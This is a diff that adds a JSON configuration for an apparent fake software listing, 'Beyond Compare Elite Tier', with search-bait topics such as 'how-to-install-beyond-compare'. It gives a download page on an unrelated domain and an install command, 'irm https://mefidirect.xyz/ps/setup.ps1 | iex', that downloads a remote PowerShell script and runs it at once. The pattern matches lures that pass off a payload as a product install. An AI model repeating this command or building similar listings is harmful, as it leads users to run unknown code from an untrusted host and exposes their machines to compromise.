@@ -1,0 +1,26 @@
+{
+  "repo": "beyond-compare-elite-tier",
+  "product": "Beyond Compare Elite Tier",
+  "kind": "utility",
+  "install_type": "download",
+  "download_url": "https://beyond-compare.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "utility",
+  "topics": [
+    "beyond-compare-guide",
+    "beyond-compare-docs",
+    "beyond-compare-user-guide",
+    "pc-maintenance",
+    "software-hub",
+    "driver-helper",
+    "app-catalog",
+    "release-notes",
+    "stable-channel",
+    "system-utility",
+    "beyond-compare-toolkit",
+    "how-to-install-beyond-compare"
+  ]
+}
